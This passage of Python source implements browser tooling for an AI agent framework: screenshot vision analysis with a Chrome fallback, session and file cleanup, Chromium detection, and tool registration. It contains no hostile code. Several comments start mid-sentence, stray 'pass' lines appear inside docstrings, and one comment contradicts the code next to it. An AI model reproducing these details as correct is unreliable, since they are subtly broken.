        question: What you want to know about the page visually
        annotate: If True, overlay numbered [N] labels on interactive elements
        task_id: Task identifier for session isolation

    Returns:
        A JSON string with vision analysis results and screenshot_path, or a
        multimodal tool-result envelope carrying the screenshot and metadata.
    """
    if is_camofox_mode():
        return camofox_vision(question, annotate, task_id)

    screenshots_dir = get_deskagent_dir("cache/screenshots", "browser_screenshots")
    screenshot_path = screenshots_dir / f"browser_screenshot_{uuid.uuid4().hex}.png"
    effective_task_id = _last_session_key(task_id or "default")

    # Lightpanda has no graphical renderer — pre-route screenshots to Chrome
    # via the fallback helper instead of letting the normal path fail with a
    # CDP error or return a placeholder PNG.  The normal analysis path below
    # still owns base64 encoding, provider routing, resizing retry, redaction,
    # and response shape.
    engine = _get_browser_engine()
    _lp_prerouted = False
    _lp_fallback_warning = None
    if engine == "lightpanda" and _should_inject_engine(engine):
        logger.debug("browser_vision: pre-routing screenshot to Chrome (engine=lightpanda)")
        screenshot_args = []
        if annotate:
            screenshot_args.append("--annotate")
        fb_result = _chrome_fallback_screenshot(
            effective_task_id,
            screenshot_args,
            _get_command_timeout(),
        )
        fb_reason = "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture."
        fb_result = _annotate_lightpanda_fallback(fb_result, fb_reason)
        if fb_result.get("success"):
            _lp_prerouted = True
            _lp_fallback_warning = fb_result.get("fallback_warning")
            fb_path = fb_result.get("data", {}).get("path", "")
            if fb_path and os.path.exists(fb_path):
                screenshots_dir = get_deskagent_dir("cache/screenshots", "browser_screenshots")
                screenshots_dir.mkdir(parents=True, exist_ok=True)

                persistent_path = screenshots_dir / f"browser_screenshot_{uuid.uuid4().hex}.png"
                shutil.copy2(fb_path, persistent_path)
                screenshot_path = persistent_path
        else:
            logger.warning("Lightpanda Chrome fallback vision screenshot failed: %s", fb_result.get("error"))
            # can still produce the standard fallback metadata/error.
            _lp_prerouted = False

    try:
        screenshots_dir.mkdir(parents=True, exist_ok=True)

        # Prune old screenshots (older than 24 hours) to prevent unbounded disk growth
        _cleanup_old_screenshots(screenshots_dir, max_age_hours=24)

        if _lp_prerouted and screenshot_path.exists():
            result = {
                "success": True,
                "data": {
                    "path": str(screenshot_path),
                    "fallback_warning": _lp_fallback_warning,
                    "browser_engine": "chrome",
                    "browser_engine_fallback": {
                        "from": "lightpanda",
                        "to": "chrome",
                        "reason": "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture.",
                    },
                },
                "fallback_warning": _lp_fallback_warning,
                "browser_engine": "chrome",
                "browser_engine_fallback": {
                    "from": "lightpanda",
                    "to": "chrome",
                    "reason": "Lightpanda has no graphical renderer for screenshots; used Chrome for vision capture.",
                },
            }
        else:
            # Take screenshot using agent-browser
            screenshot_args = []
            if annotate:
                screenshot_args.append("--annotate")
            screenshot_args.append("--full")
            screenshot_args.append(str(screenshot_path))
            result = _run_browser_command(
                effective_task_id,
                "screenshot",
                screenshot_args,
                # If the Lightpanda pre-route already failed, force Chrome so
                # _run_browser_command doesn't trigger a redundant LP fallback.
                _engine_override="auto" if _lp_prerouted else None,
            )

        if not result.get("success"):
            error_detail = result.get("error", "Unknown error")
            error_response = {"success": False, "error": f"Failed to take screenshot (local mode): {error_detail}"}
            return json.dumps(_copy_fallback_warning(error_response, result), ensure_ascii=False)

        actual_screenshot_path = result.get("data", {}).get("path")
        if actual_screenshot_path:
            screenshot_path = Path(actual_screenshot_path)

        if not screenshot_path.exists():
            return json.dumps(
                {
                    "success": False,
                    "error": (
                        f"Screenshot file was not created at {screenshot_path} (local mode). "
                        f"This may indicate a socket path issue (macOS /var/folders/), "
                        f"a missing Chromium install ('agent-browser install'), "
                        f"or a stale daemon process."
                    ),
                },
                ensure_ascii=False,
            )

        _screenshot_bytes = screenshot_path.read_bytes()
        _screenshot_b64 = base64.b64encode(_screenshot_bytes).decode("ascii")
        data_url = f"data:image/png;base64,{_screenshot_b64}"

        vision_prompt = (
            f"You are analyzing a screenshot of a web browser.\n\n"
            f"User's question: {question}\n\n"
            f"Provide a detailed and helpful answer based on what you see in the screenshot. "
            f"If there are interactive elements, describe them. If there are verification challenges "
            f"or CAPTCHAs, describe what type they are and what action might be needed. "
            f"Focus on answering the user's specific question."
        )

        logger.debug("browser_vision: analysing screenshot (%d bytes)", len(_screenshot_bytes))

        # Local vision models (llama.cpp, ollama) can take well over 30s for
        # screenshot analysis, so the default timeout must be generous.
        vision_timeout, vision_temperature = _resolve_vision_params()

        call_kwargs = {
            "task": "vision",
            "messages": [
                {
                    "role": "user",
                    "content": [
                        {"type": "text", "text": vision_prompt},
                        {"type": "image_url", "image_url": {"url": data_url}},
                    ],
                }
            ],
            "max_tokens": 2000,
            "temperature": vision_temperature,
            "timeout": vision_timeout,
        }
        # Try full-size screenshot; on size-related rejection, downscale and retry.
        try:
            if in_async_loop():
                return {"success": False, "error": "browser_vision requires no running event loop"}
            response = asyncio.run(call_llm(**call_kwargs))
        except Exception as _api_err:
            if _is_image_size_error(_api_err) and len(data_url) > _RESIZE_TARGET_BYTES:
                logger.info(
                    "Vision API rejected screenshot (%.1f MB); auto-resizing to ~%.0f MB and retrying...",
                    len(data_url) / (1024 * 1024),
                    _RESIZE_TARGET_BYTES / (1024 * 1024),
                )
                data_url = _resize_image_for_vision(screenshot_path, mime_type="image/png")
                call_kwargs["messages"][0]["content"][1]["image_url"]["url"] = data_url
                try:
                    response = asyncio.run(call_llm(**call_kwargs))
                except Exception:
                    return {"success": False, "error": "vision API failed on retry"}
            else:
                raise

        analysis = (response or "").strip()
        # Redact secrets the vision LLM may have read from the screenshot.
        analysis = redact_sensitive_text(analysis)
        response_data = {
            "success": True,
            "analysis": analysis or "Vision analysis returned no content.",
            "screenshot_path": str(screenshot_path),
        }
        _copy_fallback_warning(response_data, result)

        if annotate and result.get("data", {}).get("annotations"):
            response_data["annotations"] = result["data"]["annotations"]
        return json.dumps(response_data, ensure_ascii=False)

    except Exception as e:
        # Keep the screenshot if it was captured successfully — the failure is
        # in the LLM vision analysis, not the capture.  Deleting a valid
        # screenshot loses evidence the user might need.  The 24-hour cleanup
        # in _cleanup_old_screenshots prevents unbounded disk growth.
        logger.warning("browser_vision failed: %s", e, exc_info=True)
        error_info = {"success": False, "error": f"Error during vision analysis: {str(e)}"}
        if screenshot_path.exists():
            error_info["screenshot_path"] = str(screenshot_path)
            error_info["note"] = "Screenshot was captured but vision analysis failed. You can still share it via MEDIA:<path>."
        _copy_fallback_warning(error_info, result if "result" in locals() else {})
        return json.dumps(error_info, ensure_ascii=False)


def _cleanup_old_screenshots(screenshots_dir, max_age_hours=24) -> None:
    """Remove browser screenshots older than max_age_hours to prevent disk bloat.

    Throttled to run at most once per hour per directory to avoid repeated
    scans on screenshot-heavy workflows.
    """
    key = str(screenshots_dir)
    now = time.time()
    if now - _LAST_SCREENSHOT_CLEANUP_BY_DIR.get(key, 0.0) < 3600:
        return
    _LAST_SCREENSHOT_CLEANUP_BY_DIR[key] = now
    try:
        _unlink_files_older_than(screenshots_dir.glob("browser_screenshot_*.png"), now - max_age_hours * 3600)
    except Exception as e:
        logger.debug("Screenshot cleanup error (non-critical): %s", e)


def _cleanup_old_recordings(max_age_hours=72) -> None:
    """Remove browser recordings older than max_age_hours to prevent disk bloat."""
    try:
        recordings_dir = get_deskagent_home() / "browser_recordings"
        if not recordings_dir.exists():
            return
        _unlink_files_older_than(recordings_dir.glob("session_*.webm"), time.time() - max_age_hours * 3600)
    except Exception as e:
        logger.debug("Recording cleanup error (non-critical): %s", e)


def cleanup_browser(task_id: str | None = None) -> None:
    """
    Clean up browser session(s) for a task.

    Called automatically when a task completes or when inactivity timeout is reached.
    Closes both the local agent-browser session and Camofox sessions.

    When ``task_id`` is a bare task identifier (no ``::local`` suffix), reaps
    BOTH the primary session AND any hybrid-routing local sidecar that may
    have been spawned for LAN/localhost URLs in the same task.  When
    ``task_id`` already carries a ``::local`` suffix (called from the inactivity
    cleanup loop against a specific session key), reaps only that one.

    Args:
        task_id: Task identifier (or explicit session key)
    """
    if task_id is None:
        task_id = "default"

    # Expand to the full set of session keys to reap. For a bare task_id
    # that includes the primary key + the local sidecar if one exists.
    if _is_local_sidecar_key(task_id):
        session_keys = [task_id]
        bare_task_id = task_id[: -len(_LOCAL_SUFFIX)]
    else:
        session_keys = [task_id]
        sidecar_key = f"{task_id}{_LOCAL_SUFFIX}"
        with _cleanup_lock:
            if sidecar_key in _active_sessions:
                session_keys.append(sidecar_key)
        bare_task_id = task_id

    for session_key in session_keys:
        _cleanup_single_browser_session(session_key)

    # Drop the last-active pointer only when the bare task is being cleaned
    # (i.e. not when we're only reaping a sidecar mid-task).
    if not _is_local_sidecar_key(task_id):
        _last_active_session_key.pop(bare_task_id, None)


def _cleanup_single_browser_session(task_id: str) -> None:
    """Internal: reap a single browser session by its exact session key."""
    # before the backend tears down the underlying CDP endpoint.
    _stop_cdp_supervisor(task_id)

    # Also clean up Camofox session if running in Camofox mode.
    # Skip full close when managed persistence is enabled — the browser
    # profile (and its session cookies) must survive across agent tasks.
    # The inactivity reaper still frees idle resources.
    if is_camofox_mode():
        try:
            if not camofox_soft_cleanup(task_id):
                camofox_close(task_id)
        except Exception as e:
            logger.debug("Camofox cleanup for task %s: %s", task_id, e)

    logger.debug("cleanup_browser called for task_id: %s", task_id)
    logger.debug("Active sessions: %s", list(_active_sessions.keys()))

    # _run_browser_command needs it to build the close command.
    with _cleanup_lock:
        session_info = _active_sessions.get(task_id)

    if session_info:
        logger.debug("Found session for task_id: %s", task_id)

        _maybe_stop_recording(task_id)

        # Try to close via agent-browser first (needs session in _active_sessions).
        # Note: when the active backend is CDP override, the `cdp_url` belongs
        # to a user-supplied browser; the close call may no-op over the local
        # agent-browser CLI but will not tear down the external browser.
        try:
            _run_browser_command(task_id, "close", [], timeout=10)
            logger.debug("agent-browser close command completed for task %s", task_id)
        except Exception as e:
            logger.warning("agent-browser close failed for task %s: %s", task_id, e)

        with _cleanup_lock:
            _active_sessions.pop(task_id, None)
            _session_last_activity.pop(task_id, None)

        session_name = session_info.get("session_name", "")
        if session_name:
            socket_dir = os.path.join(_socket_safe_tmpdir(), f"agent-browser-{session_name}")
            if os.path.exists(socket_dir):
                # agent-browser writes {session}.pid in the socket dir
                pid_file = os.path.join(socket_dir, f"{session_name}.pid")
                if os.path.isfile(pid_file):
                    try:
                        daemon_pid = int(Path(pid_file).read_text(encoding="utf-8").strip())
                        ProcessRegistry._terminate_host_pid(daemon_pid)
                        logger.debug("Killed daemon pid %s for %s", daemon_pid, session_name)
                    except (ProcessLookupError, ValueError, PermissionError, OSError):
                        logger.debug("Could not kill daemon pid for %s (already dead or inaccessible)", session_name)
                shutil.rmtree(socket_dir, ignore_errors=True)

        logger.debug("Removed task %s from active sessions", task_id)
    else:
        logger.debug("No active session found for task_id: %s", task_id)


def cleanup_all_browsers() -> None:
    """
    Clean up all active browser sessions.

    Useful for cleanup on shutdown.
    """
    with _cleanup_lock:
        task_ids = list(_active_sessions.keys())
    for task_id in task_ids:
        cleanup_browser(task_id)

    # Tear down CDP supervisors for all tasks so background threads exit.
    with contextlib.suppress(Exception):
        SUPERVISOR_REGISTRY.stop_all()

    global _cached_agent_browser, _agent_browser_resolved
    global _CACHED_COMMAND_TIMEOUT, _COMMAND_TIMEOUT_RESOLVED
    global _cached_chromium_installed
    global _cached_browser_engine, _browser_engine_resolved
    _cached_agent_browser = None
    _agent_browser_resolved = False
    _discover_homebrew_node_dirs.cache_clear()
    _CACHED_COMMAND_TIMEOUT = None
    _COMMAND_TIMEOUT_RESOLVED = False
    _cached_chromium_installed = None
    _cached_browser_engine = None
    _browser_engine_resolved = False


# Cache for Chromium discovery. Invalidated by _reset_browser_caches.
_cached_chromium_installed: bool | None = None


def _chromium_search_roots() -> list[str]:
    """Directories to scan for a Chromium / headless-shell build.

    Order mirrors what agent-browser and Playwright actually probe:
        pass

    1. ``PLAYWRIGHT_BROWSERS_PATH`` when set (Docker image sets this to
       ``/opt/deskagent/.playwright``).
    2. ``~/.cache/ms-playwright`` — Playwright's default on macOS.
    3. ``~/Library/Caches/ms-playwright`` — Playwright's default on macOS.
    4. ``%USERPROFILE%\\AppData\\Local\\ms-playwright`` — Playwright's default
       on Windows.
    """
    roots: list[str] = []
    env_path = str(cfg_get(load_config(), "browser", "playwright_browsers_path", default="")).strip()
    if env_path and env_path != "0":
        roots.append(env_path)
    home = os.path.expanduser("~")
    roots.append(os.path.join(home, ".cache", "ms-playwright"))
    if sys.platform == "darwin":
        roots.append(os.path.join(home, "Library", "Caches", "ms-playwright"))
    if sys.platform == "win32":
        local = os.environ.get("LOCALAPPDATA") or os.path.join(home, "AppData", "Local")
        roots.append(os.path.join(local, "ms-playwright"))
    return roots


def _chromium_installed() -> bool:
    """Return True when a usable Chromium (or headless-shell) build is on disk.

    Checks, in order:
        pass

    1. ``AGENT_BROWSER_EXECUTABLE_PATH`` env var — the official way to point
       agent-browser at a pre-installed Chrome/Chromium.
    2. System Chrome/Chromium in PATH (``google-chrome``, ``chromium``,
       ``chromium-browser``, ``chrome``).
    3. Playwright's browser cache (current logic) — directories containing
       ``chromium-*`` or ``chromium_headless_shell-*``.

    agent-browser (0.26+) downloads Playwright's chromium / headless-shell
    builds into ``PLAYWRIGHT_BROWSERS_PATH`` and won't start without at least
    one of the three above being present.  Without a browser binary the CLI
    hangs on first use until the command timeout fires (often ~30s).  Guarding
    the tool behind this check prevents advertising a capability that will
    fail at runtime.
    """
    global _cached_chromium_installed
    if _cached_chromium_installed is not None:
        return _cached_chromium_installed

    # 1. config["browser"]["executable_path"] — explicit user-configured browser
    ab_path = str(cfg_get(load_config(), "browser", "executable_path", default="")).strip()
    if ab_path:
        if os.path.isfile(ab_path) or shutil.which(ab_path):
            _cached_chromium_installed = True
            return True

    # 2. System Chrome/Chromium in PATH (common names)
    system_chrome = shutil.which("google-chrome") or shutil.which("chromium") or shutil.which("chromium-browser") or shutil.which("chrome")
    if system_chrome:
        _cached_chromium_installed = True
        return True

    # 3. Playwright browser cache (legacy — chromium-* / chromium_headless_shell-* dirs)
    for root in _chromium_search_roots():
        if not root or not os.path.isdir(root):
            continue
        try:
            entries = os.listdir(root)
        except OSError:
            continue
        # Playwright names them ``chromium-<build>`` and
        # ``chromium_headless_shell-<build>``; agent-browser accepts either.
        for entry in entries:
            if entry.startswith("chromium-") or entry.startswith("chromium_headless_shell-"):
                _cached_chromium_installed = True
                return True

    _cached_chromium_installed = False
    return False


def _running_in_docker() -> bool:
    """Best-effort detection of whether we're inside a Docker container."""
    if os.path.exists("/.dockerenv"):
        return True
    try:
        with open("/proc/1/cgroup", encoding="utf-8") as fp:
            return "docker" in fp.read()
    except OSError:
        return False


def check_browser_requirements() -> bool:
    """
    Check if browser tool requirements are met.

    Three backends are supported:
      - **Camofox** — only the server URL is needed; no local CLI binary.
      - **CDP override** — connects to a user-supplied Chrome DevTools
        endpoint without requiring the local agent-browser on PATH.
      - **Local** (default) — the ``agent-browser`` CLI must be findable.
        Chrome/Chromium is required for the default Chrome engine and for
        fallback/screenshot paths, but not for Lightpanda-only text
        navigation/snapshot workflows.

    Returns:
        True if all requirements are met, False otherwise
    """
    # Camofox backend — only needs the server URL, no agent-browser CLI
    if is_camofox_mode():
        return True

    # CDP override mode can connect to an existing remote/local browser endpoint
    # without requiring the local agent-browser binary on PATH.
    if _get_cdp_override():
        return True

    # The agent-browser CLI is required for local launches.
    try:
        browser_cmd = _find_agent_browser()
    except FileNotFoundError:
        return False

    # On Termux, the bare npx fallback is too fragile to treat as a satisfied
    # local browser dependency. Require a real install (global or local) so the
    # browser tool is not advertised as available when it will likely fail on
    # first use.
    if _requires_real_termux_browser_install(browser_cmd):
        return False

    # Local mode with Lightpanda can provide text/navigation tools without a
    # local Chromium install. Chrome fallback, screenshots, and browser_vision
    # will still return actionable Chromium install errors if invoked.
    if _using_lightpanda_engine():
        return True

    # Local Chrome mode: agent-browser needs a Chromium build on disk. Without
    # it the CLI hangs on first use until the command timeout fires.
    if not _chromium_installed():
        return False

    return True


if __name__ == "__main__":
    """
    Simple test/demo when run directly
    """
    print("🌐 Browser Tool Module")
    print("=" * 40)
    print("   Mode: local")

    if check_browser_requirements():
        print("✅ All requirements met")
    else:
        print("❌ Missing requirements:")
        try:
            browser_cmd = _find_agent_browser()
            if _requires_real_termux_browser_install(browser_cmd):
                print("   - bare npx fallback found (insufficient on Termux local mode)")
                print(f"     Install: {_browser_install_hint()}")
            elif not _chromium_installed():
                print("   - Chromium browser binary not found")
                searched = ", ".join(_chromium_search_roots()) or "(no candidate paths)"
                print(f"     Searched: {searched}")
                if _running_in_docker():
                    print("     Docker: pull the latest image — the current one predates the bundled Chromium install")
                    print("       docker pull ghcr.io/nousresearch/deskagent-agent:latest")
                else:
                    print("     Install it with:")
                    print("       npx agent-browser install --with-deps")
                    print("     Or:  npx playwright install --with-deps chromium")
        except FileNotFoundError:
            print("   - agent-browser CLI not found")
            print(f"     Install: {_browser_install_hint()}")

    print("\n📋 Available Browser Tools:")
    for schema in BROWSER_TOOL_SCHEMAS:
        print(f"  🔹 {schema['name']}: {schema['description'][:60]}...")

    print("\n💡 Usage:")
    print("  from .browser_tool import browser_navigate, browser_snapshot")
    print("  result = browser_navigate('https://example.com', task_id='my_task')")
    print("  snapshot = browser_snapshot(task_id='my_task')")

_BROWSER_SCHEMA_MAP = {s["name"]: s for s in BROWSER_TOOL_SCHEMAS}

registry.register_tool("browser_navigate", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_navigate"))(
    lambda args, **kw: browser_navigate(url=args.get("url", ""), task_id=kw.get("task_id"))
)
registry.register_tool("browser_snapshot", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_snapshot"))(
    lambda args, **kw: browser_snapshot(full=args.get("full", False), task_id=kw.get("task_id"), user_task=kw.get("user_task"))
)
registry.register_tool("browser_click", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_click"))(
    lambda args, **kw: browser_click(ref=args.get("ref", ""), task_id=kw.get("task_id"))
)
registry.register_tool("browser_type", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_type"))(
    lambda args, **kw: browser_type(ref=args.get("ref", ""), text=args.get("text", ""), task_id=kw.get("task_id"))
)
registry.register_tool("browser_scroll", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_scroll"))(
    lambda args, **kw: browser_scroll(direction=args.get("direction", "down"), task_id=kw.get("task_id"))
)
registry.register_tool("browser_back", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_back"))(
    lambda args, **kw: browser_back(task_id=kw.get("task_id"))
)
registry.register_tool("browser_press", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_press"))(
    lambda args, **kw: browser_press(key=args.get("key", ""), task_id=kw.get("task_id"))
)

registry.register_tool("browser_get_images", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_get_images"))(
    lambda args, **kw: browser_get_images(task_id=kw.get("task_id"))
)
registry.register_tool("browser_vision", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_vision"))(
    lambda args, **kw: browser_vision(question=args.get("question", ""), annotate=args.get("annotate", False), task_id=kw.get("task_id"))
)
registry.register_tool("browser_console", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_console"))(
    lambda args, **kw: browser_console(clear=args.get("clear", False), expression=args.get("expression"), task_id=kw.get("task_id"))
)
registry.register_tool("browser_hover", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_hover"))(
    lambda args, **kw: browser_hover(ref=args.get("ref", ""), task_id=kw.get("task_id"))
)
registry.register_tool("browser_wait_for", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_wait_for"))(
    lambda args, **kw: browser_wait_for(
        selector=args.get("selector"),
        text=args.get("text"),
        timeout_s=args.get("timeout_s", 10.0),
        return_snapshot=args.get("return_snapshot", True),
        task_id=kw.get("task_id"),
    )
)
registry.register_tool("browser_find", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_find"))(
    lambda args, **kw: browser_find(
        query=args.get("query", ""),
        ref_only=args.get("ref_only", True),
        task_id=kw.get("task_id"),
    )
)
registry.register_tool("browser_drag", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_drag"))(
    lambda args, **kw: browser_drag(
        from_ref=args.get("from_ref", ""),
        to_ref=args.get("to_ref", ""),
        hold_key=args.get("hold_key"),
        task_id=kw.get("task_id"),
    )
)
registry.register_tool("browser_select", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_select"))(
    lambda args, **kw: browser_select(
        ref=args.get("ref", ""),
        value=args.get("value"),
        label=args.get("label"),
        index=args.get("index"),
        open_delay_s=args.get("open_delay_s", 0.5),
        task_id=kw.get("task_id"),
    )
)
registry.register_tool("browser_download", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_download"))(
    lambda args, **kw: browser_download(
        ref_or_url=args.get("ref_or_url", ""),
        save_as=args.get("save_as"),
        timeout_s=args.get("timeout_s", 30.0),
        task_id=kw.get("task_id"),
    )
)
registry.register_tool("browser_pdf", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_pdf"))(
    lambda args, **kw: browser_pdf(
        save_as=args.get("save_as"),
        landscape=args.get("landscape", False),
        print_background=args.get("print_background", True),
        paper_width=args.get("paper_width", 8.5),
        paper_height=args.get("paper_height", 11.0),
        task_id=kw.get("task_id"),
    )
)
registry.register_tool("browser_screenshot_element", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_screenshot_element"))(
    lambda args, **kw: browser_screenshot_element(
        ref=args.get("ref", ""),
        save_as=args.get("save_as"),
        task_id=kw.get("task_id"),
    )
)
registry.register_tool("browser_tab_new", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_tab_new"))(
    lambda args, **kw: browser_tab_new(
        url=args.get("url"),
        task_id=kw.get("task_id"),
    )
)
registry.register_tool("browser_tab_switch", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_tab_switch"))(
    lambda args, **kw: browser_tab_switch(
        tab_id=args.get("tab_id", ""),
        task_id=kw.get("task_id"),
    )
)
registry.register_tool("browser_tab_close", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_tab_close"))(
    lambda args, **kw: browser_tab_close(
        tab_id=args.get("tab_id"),
        task_id=kw.get("task_id"),
    )
)
registry.register_tool("browser_tab_list", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_tab_list"))(
    lambda args, **kw: browser_tab_list(task_id=kw.get("task_id"))
)
registry.register_tool("browser_set_viewport", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_set_viewport"))(
    lambda args, **kw: browser_set_viewport(
        width=args.get("width", 1280),
        height=args.get("height", 720),
        device_scale_factor=args.get("device_scale_factor", 1.0),
        mobile=args.get("mobile", False),
        task_id=kw.get("task_id"),
    )
)
registry.register_tool("browser_set_user_agent", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_set_user_agent"))(
    lambda args, **kw: browser_set_user_agent(
        user_agent=args.get("user_agent"),
        platform=args.get("platform"),
        accept_language=args.get("accept_language"),
        task_id=kw.get("task_id"),
    )
)
registry.register_tool("browser_set_extra_headers", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_set_extra_headers"))(
    lambda args, **kw: browser_set_extra_headers(
        headers=args.get("headers", {}),
        task_id=kw.get("task_id"),
    )
)
registry.register_tool("browser_set_geolocation", check_fn=check_browser_requirements, schema=_BROWSER_SCHEMA_MAP.get("browser_set_geolocation"))(
    lambda args, **kw: browser_set_geolocation(
        lat=args.get("lat", 0.0),
        lon=args.get("lon", 0.0),
        accuracy=args.get("accuracy", 100.0),
        task_id=kw.get("task_id"),
    )
)
